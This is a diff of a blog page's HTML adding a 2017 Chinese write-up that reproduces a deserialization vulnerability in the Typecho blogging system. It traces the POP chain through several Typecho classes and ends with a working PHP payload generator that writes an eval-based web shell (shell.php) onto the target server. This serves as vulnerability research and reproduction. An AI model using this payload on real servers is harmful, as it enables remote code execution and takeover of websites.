@@ -109,15 +109,23 @@ border-left-color: #A349A4; /*左边框颜色*/
 
 
 
-<meta name="description" content="Slow and steady wins the race.">
-<meta property="og:type" content="website">
+<meta name="description" content="typecho反序列化漏洞复现###0X00 前言Typecho是一个基于php的简单轻巧的开源博客系统，最近看到了这个漏洞，就顺手复现了一下。。。 ###0X01. 漏洞版本V1.1-15.5.12-beta以前 ###0X02 漏洞分析反序列化可控点：install.php 229~235行该博客程序判断是否安装的代码如下 //判断是否已经安装if (!isset($_GET[‘finish’">
+<meta name="keywords">
+<meta property="og:type" content="article">
 <meta property="og:title" content="tharavel's blog">
-<meta property="og:url" content="http://nt0rrent.xyz/archives/2017/06/index.html">
+<meta property="og:url" content="http://nt0rrent.xyz/2017/10/29/typecho/index.html">
 <meta property="og:site_name" content="tharavel's blog">
-<meta property="og:description" content="Slow and steady wins the race.">
+<meta property="og:description" content="typecho反序列化漏洞复现###0X00 前言Typecho是一个基于php的简单轻巧的开源博客系统，最近看到了这个漏洞，就顺手复现了一下。。。 ###0X01. 漏洞版本V1.1-15.5.12-beta以前 ###0X02 漏洞分析反序列化可控点：install.php 229~235行该博客程序判断是否安装的代码如下 //判断是否已经安装if (!isset($_GET[‘finish’">
+<meta property="og:image" content="http://op5cjcnmi.bkt.clouddn.com/1.PNG">
+<meta property="og:image" content="http://op5cjcnmi.bkt.clouddn.com/2.PNG">
+<meta property="og:image" content="http://op5cjcnmi.bkt.clouddn.com/3.PNG">
+<meta property="og:image" content="http://op5cjcnmi.bkt.clouddn.com/4.PNG">
+<meta property="og:image" content="http://op5cjcnmi.bkt.clouddn.com/5.PNG">
+<meta property="og:updated_time" content="2017-10-29T14:48:59.283Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="tharavel's blog">
-<meta name="twitter:description" content="Slow and steady wins the race.">
+<meta name="twitter:description" content="typecho反序列化漏洞复现###0X00 前言Typecho是一个基于php的简单轻巧的开源博客系统，最近看到了这个漏洞，就顺手复现了一下。。。 ###0X01. 漏洞版本V1.1-15.5.12-beta以前 ###0X02 漏洞分析反序列化可控点：install.php 229~235行该博客程序判断是否安装的代码如下 //判断是否已经安装if (!isset($_GET[‘finish’">
+<meta name="twitter:image" content="http://op5cjcnmi.bkt.clouddn.com/1.PNG">
 
 
 
@@ -145,13 +153,13 @@ border-left-color: #A349A4; /*左边框颜色*/
 
 
 
-  <link rel="canonical" href="http://nt0rrent.xyz/archives/2017/06/"/>
+  <link rel="canonical" href="http://nt0rrent.xyz/2017/10/29/typecho/"/>
 
 
 
 
 
-  <title>归档 | tharavel's blog</title>
+  <title> | tharavel's blog</title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -176,7 +184,7 @@ border-left-color: #A349A4; /*左边框颜色*/
     
   
 
-  <div class="container sidebar-position-left  page-archive  ">
+  <div class="container sidebar-position-left page-post-detail ">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -314,66 +322,183 @@ border-left-color: #A349A4; /*左边框颜色*/
           <div id="content" class="content">
             
 
-  <section id="posts" class="posts-collapse">
-    <span class="archive-move-on"></span>
+  <div id="posts" class="posts-expand">
+    
 
-    <span class="archive-page-counter">
-      
-      
-      
-        
-      
-      嗯..! 目前共计 1 篇日志。 继续努力。
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://nt0rrent.xyz/2017/10/29/typecho/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="tharavel">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="tharavel's blog">
     </span>
 
     
+      <header class="post-header">
 
-      
-      
-      
-
-      
         
-        <div class="collection-title">
-          <h2 class="archive-year motion-element" id="archive-year-2017">2017</h2>
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-10-29T22:51:04+08:00">
+                2017-10-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a class="cloud-tie-join-count" href="/2017/10/29/typecho/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count join-count" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
         </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
       
       
 
       
+        <h2 id="typecho反序列化漏洞复现"><a href="#typecho反序列化漏洞复现" class="headerlink" title="typecho反序列化漏洞复现"></a>typecho反序列化漏洞复现</h2><p>###0X00 前言<br>Typecho是一个基于php的简单轻巧的开源博客系统，最近看到了这个漏洞，就顺手复现了一下。。。</p>
+<p>###0X01. 漏洞版本<br>V1.1-15.5.12-beta以前</p>
+<p>###0X02 漏洞分析<br>反序列化可控点：install.php 229~235行<br><img src="http://op5cjcnmi.bkt.clouddn.com/1.PNG" alt="此处输入图片的描述"><br>该博客程序判断是否安装的代码如下</p>
+<p><pre><br>//判断是否已经安装<br>if (!isset($_GET[‘finish’]) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . ‘/config.inc.php’) &amp;&amp; empty($_SESSION[‘typecho’])) {<br>    exit;<br>}<br>// 挡掉可能的跨站请求<br>if (!empty($_GET) || !empty($_POST)) {<br>    if (empty($_SERVER[‘HTTP_REFERER’])) {<br>        exit;<br>    }</pre></p>
+<pre><code>$parts = parse_url($_SERVER[&apos;HTTP_REFERER&apos;]);
+if (!empty($parts[&apos;port&apos;])) {
+    $parts[&apos;host&apos;] = &quot;{$parts[&apos;host&apos;]}:{$parts[&apos;port&apos;]}&quot;;
+}
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+if (empty($parts[&apos;host&apos;]) || $_SERVER[&apos;HTTP_HOST&apos;] != $parts[&apos;host&apos;]) {
+    exit;
+}
+</code></pre><p>}</p>
+<p><br>这里的判断逻辑有点滑稽，参数中含有finish并且Referer是内网即可进入install.php。。。现在先决条件已具备，接着分析。</p>
+<p>这里有一个反序列化操作，而参数从cookie获取，可控。   想到构造POP链。既然是序列化，免不了利用对象，于是跟进Typecho_Db对象<br><img src="http://op5cjcnmi.bkt.clouddn.com/2.PNG" alt="此处输入图片的描述"><br>看到这里对传入的参数\$adapterName进行了字符串拼接操作，如果$adapterName是一个实例化对象，就会触发__tostring魔法方法，全局搜索发现__tostring方法出现在以下三个类中：</p>
+<blockquote>
+<p>Typecho_Feed<br>Typecho_Config<br>Typecho_Db_Query</p>
+</blockquote>
+<p>分别跟进后发现只有Typecho_Feed类可利用，可利用地点如下：<br><img src="http://op5cjcnmi.bkt.clouddn.com/3.PNG" alt="此处输入图片的描述"><br>在290行，如果screenName是不可访问变量，便会调用__get()魔法方法，搜索<strong>get()方法，有好几处，分析后发现在Typecho\</strong>Request类中可以利用。在该类中__get方法调用了get方法，而在get方法中又调用了_applyFilter方法<br><img src="http://op5cjcnmi.bkt.clouddn.com/4.PNG" alt="此处输入图片的描述"></p>
+<p>跟进该方法<br><img src="http://op5cjcnmi.bkt.clouddn.com/5.PNG" alt="此处输入图片的描述"><br>醒目的array_map函数和call_user_func函数。。。<br>至此POP链已经构造完成。</p>
+<p>###0X03 Payload<br>    &lt;?php<br>    class Typecho_Feed{<br>        private $_type = ‘RSS 2.0’;<br>    private $_items;<br>        public function __construct($a)<br>        {<br>            $this-&gt;_items[] = array(‘author’=&gt;$a);<br>        }<br>    }</p>
+<pre><code>class Typecho_Request{
+    private $_params = array(&apos;screenName&apos;=&gt;&apos;file_put_contents(&apos;shell.php&apos;, &apos;&lt;?php @eval($_POST[tharavel]);?&gt;&apos;)&apos;);
+    private $_filter = array(&apos;assert&apos;);
+}
 
-      <h1 class="post-title">
+$payload1 = new Typecho_Request();
+$payload2 = new Typecho_Feed($payload1);
+$exp = array(&apos;adapter&apos; =&gt; $payload2, &apos;prefix&apos; =&gt; &apos;typecho&apos;);
+
+echo base64_encode(serialize($exp));
+</code></pre>
+      
+    </div>
+
+    <div>
+      
         
-            <a class="post-title-link" href="/2017/06/11/hello-world/" itemprop="url">
-              
-                <span itemprop="name">Hello World</span>
-              
-            </a>
+
+      
+    </div>
+	
+	<div>
+	  
+	    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">------本文结束<i class="fa fa-paw"></i>感谢阅读------</div>
+    
+</div>
+	  
+	</div>
+
+    <div>
+      
         
-      </h1>
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-06-11T22:55:46+08:00"
-              content="2017-06-11" >
-          06-11
-        </time>
-      </div>
+      
+    </div>
 
-    </header>
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+        
+      
+
+      
+
+      
+      
+    </footer>
   </article>
 
 
 
-    
-
-  </section>
-
-  
-
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -381,6 +506,12 @@ border-left-color: #A349A4; /*左边框颜色*/
 
 
           
+  <div class="comments" id="comments">
+    
+      <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
+    
+  </div>
+
 
         </div>
         
@@ -402,8 +533,17 @@ border-left-color: #A349A4; /*左边框颜色*/
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel sidebar-panel-active">
+      <section class="site-overview sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/images/avatar.gif"
@@ -474,6 +614,22 @@ border-left-color: #A349A4; /*左边框颜色*/
 
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#typecho反序列化漏洞复现"><span class="nav-number">1.</span> <span class="nav-text">typecho反序列化漏洞复现</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -584,11 +740,9 @@ border-left-color: #A349A4; /*左边框颜色*/
   
 
   
-  
-    <script type="text/javascript" id="motion.page.archive">
-      $('.archive-year').velocity('transition.slideLeftIn');
-    </script>
-  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
 
 
   
